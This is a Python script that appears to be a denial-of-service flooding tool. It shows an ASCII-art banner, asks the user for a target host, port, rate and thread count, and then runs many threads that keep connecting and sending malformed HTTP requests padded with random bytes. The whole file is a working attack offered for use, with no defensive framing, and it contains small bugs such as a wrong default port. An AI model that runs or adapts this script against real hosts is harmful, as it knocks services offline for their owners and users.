

import socket
import time
import os
import random

from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95mkra'
    OKBLUE = '\033[94mkra'
    OKGREEN = '\033[92'
    WARNING = '\033[93makra'
    FAIL = '\033[91m'
    BOLD = '\033[1makra'
    
print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
               
               
 GGGP5JBBGGGGPYYBBGB#######&PYBBG5P###BGBBPGY!77!JJ?GG#######BPGBG#BGPPGGGPGGBBGGGPYPGGPPGGGPPPPPPGG
GJYGGP5BBGGBB5PGG5Y5PP###&##BPY##G##BB#GPGGBBPGGY?55GB####BBBGPGGGGGBGGGGBBGPGGPPPPPP5P5P55PPGGGPYPG
BPGBBPP#BBBGBBGBP55BGB#######PB#GB##PPPJYYBGG5PGB####GB#BGG##GBGBBGPPGGPPPGG5PPG55?YGGGPP55GGGBG??5G
BGGBBGB##BBBBBYPBBBBG#BBB#B#BPPGBGGBBB5PP5PPPY5GB####BGGPPPP#GBPGP5555GBP5PPPPP55PY5B#GP5PPBB#BGPGPG
PYGB##B#####PBBGBB###B###########BBGGBBG##GGGPGGGPBBBY!7J5PPPP5YGGGGPY5PPPPPGJ5YJYP5PBBBBG5BGGGGPPGG
#GG##B#&&###G##BGGP5BB######GGB#BB##GBGP55JP5J?YY5GGJYYJJGGGG5Y?5GPGPGGGGPGGG55Y5PJ?PBBPGGG55PGPPGBG
GBB###&&GPB##B#55GBBBB####BBGGBBB#GGGP555PPP557J5PGYJ5PJ??!?GBYJJ55PPGPPPPGBBBGP5PPPPPPPGPPP5PPBGPGB
##BB##&PJPBGBB#GB####B#&####BBBBPP??GGPPJ77Y55JPPGP?BBG5?7JGGP5PYP5J5GPJJGY7PBGGBGP5JYPGGPPGBPGGBYJG
&#BB#&#PPGY5GB&###BGBB&&##BGB#BGGGYJ7!7J^:7YY?75PJ!~YYJBBGP5PPY??YJ?PP555P5YPG5PGGPGBB#BGGPGGBGGGPPP
###B&&#BBGBG5P5GBGBBYG&#BB#GGBBBG5Y7~^~^^7?5?~JP5Y!~!?P5YPPGGBGPJ5Y57:!?YYGGGPGPPGPP###BBGGBBBGGPPP5
BB####&BPG#BBB?JPG#BG#&&#B##GPPPYYYY7!J^~77?J77P5G?7~^Y??JJYY5PPYJ7YY!7~7PPGGGPGP5PPBBGBBGBBBGBBGGGG
BBBB#####BGGP##PB##&#&#&##&B5J??Y55J!!~^~^.?YJY?J5????J?7?555?7JGPJY5YJ?555PG5PPP55GBGYPBBBBBBGG#GBB
GGBBB#####BBB#BB#&&&&&#####P5?????GP5?7^~~~?Y?77PPG5PGYJPP5!7JY??5BJ^?555555GGBP5PPGBPPY5GGGBBBB#BG#
BBBB#&&##&##&BB####&#&#####YJ5PP5J?!!!!77J?7!JJPGGG5?Y?^7?7YJ?Y7?55GP5YJJPBGBBBBGGGP55P55GPGBGGPGBB#
#BBB#&&B#####B&##GB###&&B##G55BB5!^^:^^^!~^^!!^J?7J?7?7~!??YJ?~~7J~!5PPJJYB#BBB#BBBBPGBPPPPYGGGGG###
GBBGB##G#&###PBBBGGB#B&&####BG#P7!!^.:7?!!7~7?~?!~?7^7?!~~7~^??~~::~7J5PGPB#BBB##G###BGGP5B#BBGBB#B#
BGBGB###&GGBB##G##B#&#&##BPB#BY5JJ!:::~!!^:::^!~!7~^^?Y?!!~77!!!77?Y?YJJPPGBBGGBBB###BG##B#BPGGBBBBB
BBBB##BB##GPGB##&#####&&#YY5PBPYY7J~.:.:^^::~!?7?J!:7JJ7!~5P7~??55J?!~^~?55GPGBGGBB#&BBB#&BPPGBBBGGB
B#BB###B##&#GGBB##&####&#GBPY?55?7?!:::^!~^:^!~7?77???7!7J?~~!!^7J7!!^~~7J~JJJYPBGGBBG&#BBBBGBGGGGGG
#B########&&BPGB#&&####&#G#G?:7JYGP?!~^~^::::^^7~7?JJY77YP5?5YJ7YJJY~^P?!7?YJ?!JGB#BBGBYPPGBGBGPG#BB
##&#####&##&#GGB&&#####BGBGPG?^:!J!~J~^:~!^:~~~!~J?7!!^^?JPJ???Y?Y7Y~!7?Y5??YYP5BBBGPGGBBGBGYGG?#BBB
#########&&&#BBB&#####BG55BJ?Y~^^^^~~::::^^^7~::^!7~:~JYYJ5J^:!J7Y!~~755?5YJGPGPGGGGBBGBBG5PYPBJ#BBG
##BBBB###&&&#55G&#B&##Y5PPPG???~~~^:::::::~^::::::::::~!77:::!!!~~^~?5YYYJ?7JGBPYP5B&#BBBGJ!!5B5BG#5
#BBBPG55B#&&#PPP#BB##P75Y?~!~!7^::::::::::::::::::::::~!7!~:~!:^~!^~??7J?^~7?7Y~!7YYYGBBBY!:^YBBGB#G
&#GGBBY5P#&&#P55B###57??7^~!^~!~~^::::::::::::::::::::.:::^::~^.::^^~!7^77^~7!~:.!PJ7?J7PBY!75GGBBBB
&&BPPGBGY#&#GJYPBB#P?7?77!^::~!!!!::::::::::::::::::::7!:::::.:::::!!~?7J7??77^:.~^~^:^!JGBYJ55PGGGG
&&GPPPGGJ##B5J5PB#P!~:.:::~~~?!~!?!~~::::::::::::::::7YY!.::::::::::~!77^:^::^~^~!^:~?!!JYGBPPPPPPPP
&#Y5GPPBB&BB5Y5GB#J??J?7!:^~^:::^Y??J?~:::::::::::::7555Y~:::::::::::::::::::^^^^:::~JY!!~JGPPGP5PPB
&&#P7PPPBBG#YY5PPBJJYYPGYJ7~!^::^!~!!~!^:::::::::::75Y555Y7:::::::::::::::::::::::::~JJ7Y~:?PPPPPY7G
&&#PY5PPGGG#YYPYG5~~????!7?^::::::::::::::::::::::!5P5P555P7:::::::::::::::::::::::::^!!?7:^5P55P!!P
BB&#BB55BGB#YYY5B!!777~7^::::::::::::::::::::::::~55P5555555~:::::::::::::::::::::::::.:^7~:JP555~J5
GBB##P5PBB#BYJYGY^?5J!7Y~:..::::::::::::::::::::^J555YY55Y55?^:::::::::::::::^J7:::::::::7~.?555Y^?Y
5BBG#PGBBB#GJY5B?!PGB5?YY?!~^^::::::::::::::::::^5555YYYYYYY5~::::::::::::::!YPY7:::::::.^::?55YYPPJ
?YBBBPP####PJJ5#YJBGGPJ!77YJ77!~^!~:::::::::::::J5P5Y5555555PJ:::::::::::::!55555?::::^?!.::!Y5Y5BG!
!?PBB5YGB##PYYP#B5PPG55?:::^~^^^75Y!::::::::::::?5555YYYJJYJPJ^:::::::::::!Y5YY555?:.^JYY!:.^Y5J5GG!
J?5GGY5GB#BJJYP#BPGP555P7^^:::^75PG5!^^^~^:::::^5PPP5JPPPGGPP5^:::::::::::Y55Y5PP55!^J5YY5!:!55J5PP!
PP5P55GGB#57JYGBBGP5PGGGP55?YJJPGBBGPJ^!?^::::~~5GPPJJY555P5PY77::::::::.!55YY55P5P5YP55555?5Y5YY5P?
YYJPJYBBB#GYY5BBBGGGBB###GJ7JY55PGGGGPJ!~:::::J5Y5Y5YYY5555YY5Y?~.:::::::J555Y5Y55PP5P55PP55YY5YJYP5
PP5PYPB#GB55PP####GGPPPGBP?!~YGP555PPPP7!!^^^!5YJ55Y555YPPPPPPY?!^^:::::^Y5Y5Y55555P5555555PJY5Y5555
BGYPG#BBBBYP5P#&#B5PGGB#G5J!!GBBGPP5PPY~::~555YJ7J5P5P5Y5555YYY??5J::::^~5GPPJYPGGG5Y5PYYPPP5JYYY555
YYY5PBBGBBPYPGBB#GYPP5555P5PGBGB#BGPPGPYJJYBBGYYYJ5##BGPPPP5PGPP5PY?!!!?5Y5YJJ55YYJYJPG55PGG5JYJJJJY
^?JJP#BPPBBY5PBG#B55GBBGGBBBBBBGGGB##B##BGGBG5YYJ5GBBBBBBBBGGGGGGGGGGGGPGPPYYY5P555PY5#PPP555?J???JJ
:7JJPB5PB#BYYPBGBBBBGGPBBB#BBB##BBB#BBB##BG#BYG&BYB#BGBBBBB55BBPPGY5Y5P5G5YYYGP5YYJ5YP#BPP5Y5?J???JJ
:!?JP5J5PBBYJ5BB#BBB55PGBGGGBBGGBBBBGGGGPGGBG7YBGYGBBBGBGGB55PPYYPYY5YYJPBPY?GGJYY5PYPGGY5PG57777?J5
^!J5Y?7YGBPJJ5B&&##BPP5PGGPPGPPPGBGGPGP5P5PGPY5555GGGGGGPGGGG5P5PP555555GPP5Y5YY5YY5YYGGPPPPY???77?G
Y??Y7YJYPPYYJ5B#BBBBB#BGBGGPPPGGGGGGGBBGGPGGPPGY5GPPGBGPGBBBBGGGBBP55JYGGGGBGGP5YY55PPPPG5PB5?JY77J5
Y7?JJ5555P5G5GBB5Y5PGGGPPP5P55J5555Y5Y5PB#BGBG5Y555PGGPGGPGGGGBG#BPPGP5G####G5GPYJ5PPY5PPP5GY7??77?Y
JJ55PYJPBBGBGB#57?JPPYYY55PPJ??J555555555PP55YYY5YYY5PP5GPGGPGPYPPPPPPPG###BGBBGPY5555YYPBBBY7J?77?Y
YYPGG5PBBBBBPGB5YJ?7JYBBBB5BGP5??YJYJYY55YYY555YYYPYYY5Y5PB#BBGJPGGBG55B#&##B#BPPPP555P5YG#&P??777?Y
Y5PPPPGBBGBGPGG5GGGYJ5BBBGPGG55YYJYGYJY5555YYY5P55Y555555YG#B#P5BGGGGPPGGGGGGGPPPGPP555PPPPB5?7777JP
YYYYY5GBPPG5PBGG5PG55YY555G#BGP5P55G55PP5Y55YY5P5PY555PP5Y5GB#GGBBBBBBBBBGBBGBP55GGP5P55PPGB5?7777JB
Y?JYYYP#5PG5PBPBGY55Y55PPYY5GGPPGGGBBGGPY555G5PG5Y55P5PPP5PGGBGG############B##5PBP5GGGGPPBBP7777?YB
57?YY55#5PB5PBJPPY55YY5PPPYYP#BG#BBBGGBGGG5PG5PGYPGGPPPPP5#B###BBBBBBBBBBBGBBBBBBBGGGBGBBBBBP77777YB
PYYYY5YB5GB5PG7555PP55GPPP5PG##PGG&P5G&#B#&#BG#BPP#B5PBBY5#G#&#B&&&B&&&B&&#B&&#B&&#BGB##&&#BG77777JB
PYJ?JJYGGGB55GPPGPPGGGGPPPBGPPBG55GPYPGGBBGBB5BGPGBGPG5PPGGB##BG##BB#BBGBB#GB#BG#BBBPGBGBBBBP77777JB
B5JJJJGBBB#PYBBBBBBBBGGGBBGPGGGGPPG5YGBBGBB##5GG5GGBBBJGBBGG#BBBBBBBBBBBBBB#B#BB##B#PG#BBBBB577777?B
&55J?JB###&G5B##BB##B#PG#BGBGPB##BB55G&#PPBG#BPPPBBBBG5GBBGGBBGG##BPB#GP#BBBB#GB##GGYPBGBPP5J7777!7P
5YG??YGGGB##PPGPGGGGGGYPPPPPPPGGGGB5YPPPPPPPP5P5PPPPP5555P5P555P555PGGGGGGGGGGGPPBGPYYP5PPPP?777?77?
JPPYPGGGBBB#GGBBBBBBBBYPBBBBBBBBBBBP5GBBBBGGBBGGGGGGBGBBBBBBBGGGPPPGGGGPPP555555PPPP55PPPPPPJ777?77J
5GPGBBBBB#BBBG5YYYYYJJP5YYYYYYYYYYYYJYYYJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ5GYYJYJJ?777?77?
GGGG#B#####BBBGPPYJJ!7YY??5GPYYYY5555YYYYYYYYYYYYYYYYYYYYJJJJYYYJJ7~JYYJJJJJJJJYYYYY555YYYYY7!77J77?
BBBBBBB##BBBB#BBBGG55YJJ?J5GPYYJJJJJJ????J?JJJJJJJJJJJJJJJJJ????JJ?7JYJ????????JJJJJJJJJYYYJJJJJ57JY
BGBBBBBBBGBBBBBBGGGGGGG5YJ???????????777??????77777777777????JJJJJY5YYYJJJYYJYYYYYYYY5555P5GGGBGBGGG
PPPPPPPPPPPPPPPPPPPPPPPPPP555555555555555P555YYYJJJJYYYY5555555P55555555555555P55555555Y555YYYYYJJJJ
JYYJJJJJJJJJJJJJJJ??JJJJJJJYYYYY55555YY5YY555YYY5YJJJYJYJJJYJJJJ????????????7777777??777777777?77777
7777??7??????????????JJJJJY5555PPPPP55PPP555YJ?7??7!!!7777777777777?777777777777?????7?7777777777777
??JJJJJJJJJJJYYJJYYYYYYYYY55YYY5555YYYYYYYJJYJ?7??7??7??J???JJJ???JJ?7?????77?77?7777??7??77777?????
JJYYYJJJJJYYY5YYYYYYYYYYYYYYYYYYYYYJJJJJJJYYYJJJ??7J?JJJJJ?JJJJJ???J??7?7?????777JJ?7???????7???J???
YYJYYYJYYYYY555555YY5YYYYY5YYYYYYYYYYYYYJJYYJYYJJJJJJYJJJJJJJJJ???????777777?77?JPP55Y5555Y??7777777
YJJJJJJYJJJJJJJJYYYYYYYYYYYYYYJYYYYYYYYYYJJJJJYJJYJ?JJ?J?J??????7?77?7???7?7??JJ5PGGGGPPPPPYJ????777
JJJJJJJJJJJJJJJJJJYYYYYYYYYYYYYYYYYYYYYYYYYY55PPPPPPP55555YYJYYJJJ????J???????J?JJJJJJYYYYJYJJ??????
               
               
      ''')
      
    
def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 8000000

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "ផ្ទះ ip :\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

i = 1000;



class Count:
    packetCounter = 1

def goForDosThatThing():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----🥀PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " -----🥀")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            except socket.error:
                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            dosSocket.close()
    except KeyboardInterrupt:
        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
try:
        
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
    _   _   _             _      ____  _             _   _             
   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
 / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                 |___/ 
          ''')
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    🇰🇭           ] 25%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     🇰🇭     ] 50%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== 🇰🇭     ] 75%")
    time.sleep(1)
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
    
    for i in range(threads):
        try:
            t = Thread(target=goForDosThatThing)
            t.start()
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")